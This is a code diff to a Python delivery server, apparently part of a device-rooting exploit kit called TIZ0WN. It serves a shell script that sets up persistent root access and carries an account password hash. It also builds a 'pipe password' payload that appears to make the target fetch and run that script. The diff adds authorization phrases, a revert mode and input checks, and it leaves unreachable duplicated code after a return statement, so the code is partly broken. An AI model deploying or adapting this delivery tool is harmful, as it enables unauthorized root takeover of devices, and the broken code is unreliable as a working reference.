@@ -36,6 +36,8 @@ import sha512crypt
 HERE = Path(__file__).resolve().parent
 TEMPLATE = HERE / "root_setup.sh"
 DEFAULT_PATH = "/d"
+SETUP_ACK = "I-AUTHORIZE-PERSISTENT-ROOT-SETUP"
+REVERT_ACK = "I-AUTHORIZE-PERSISTENT-ROOT-REVERT"
 
 
 def require_private_bind(value: str) -> str:
@@ -72,28 +74,38 @@ def prepare_body(
 
 class Handler(http.server.BaseHTTPRequestHandler):
     body_override: bytes = b""
+    http_path: str = "/d"
 
     def _send(self) -> None:
-        body = self.body_override if self.path in ("/d", "/install.sh") else b"404"
-        code = 200 if self.path in ("/d", "/install.sh") else 404
-        self.send_response(code)
-        self.send_header("Content-Type", "application/x-sh")
-        self.send_header("Content-Length", str(len(body)))
-        self.send_header("Cache-Control", "no-store")
+        ok = self.path in (self.http_path, "/install.sh")
+        body = self.body_override if ok else b"404"
+        self.send_response(200 if ok else 404)
+        if ok:
+            self.send_header("Content-Type", "application/x-sh")
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Cache-Control", "no-store")
         self.end_headers()
-        self.wfile.write(body)
+        if self.command != "HEAD":
+            self.wfile.write(body)
 
     def do_GET(self) -> None:  # noqa: N802 - stdlib name
         self._send()
 
     def do_HEAD(self) -> None:  # noqa: N802 - stdlib name
+        # Headers only: the served body carries the account password hash.
         self._send()
 
     def log_message(self, *args: object) -> None:
         return
 
 
-def build_server(*, bind: str, port: int, body: bytes) -> http.server.ThreadingHTTPServer:
+def build_server(*, bind: str, port: int, body: bytes, http_path: str = "/d"):
+    handler = type(
+        "BoundHandler",
+        (Handler,),
+        {"body_override": body, "http_path": http_path},
+    )
+    return http.server.ThreadingHTTPServer((bind, port), handler)
     handler = type(
         "BoundHandler",
         (Handler,),
@@ -115,11 +127,17 @@ def main() -> int:
     parser.add_argument("--token", required=True, help="16 lowercase hex run token")
     parser.add_argument("--ack", required=True)
     args = parser.parse_args()
-    if args.ack != "I-AUTHORIZE-PERSISTENT-ROOT-SETUP":
-        raise SystemExit("wrong authorization phrase")
+    if args.revert:
+        expected_ack = REVERT_ACK
+    else:
+        expected_ack = SETUP_ACK
+    if args.ack != expected_ack:
+        raise SystemExit(f"wrong authorization phrase; --revert needs {REVERT_ACK}")
     if not token_shape(args.token):
         raise SystemExit("--token must be 16 lowercase hex characters")
     require_private_bind(args.bind)
+    if not (1 <= args.port <= 65535):
+        raise SystemExit("--port must be 1-65535")
 
     salt = "tiz0wn" + args.token[:6]
     try:
@@ -140,9 +158,12 @@ def main() -> int:
     )
     body_sha256 = hashlib.sha256(body.encode("ascii")).hexdigest()
 
-    built = payload.build_pipe_password(
-        host_ip=args.bind, port=args.port, http_path=args.http_path
-    )
+    try:
+        built = payload.build_pipe_password(
+            host_ip=args.bind, port=args.port, http_path=args.http_path
+        )
+    except ValueError as error:
+        raise SystemExit(f"invalid delivery options: {error}") from error
     print("TIZ0WN persist-root delivery server")
     print(f"  bind:           {args.bind}:{args.port}{args.http_path}")
     print(f"  served sha256:  {body_sha256}")
@@ -154,7 +175,9 @@ def main() -> int:
     print(f"  payload length: {built.password_length} (bound {payload.REVIEWED_BOUND})")
     print("  Ctrl-C stops the server; one trigger, no retry.")
 
-    server = build_server(bind=args.bind, port=args.port, body=body.encode("ascii"))
+    server = build_server(
+        bind=args.bind, port=args.port, body=body.encode("ascii"), http_path=args.http_path
+    )
     try:
         server.serve_forever()
     except KeyboardInterrupt:
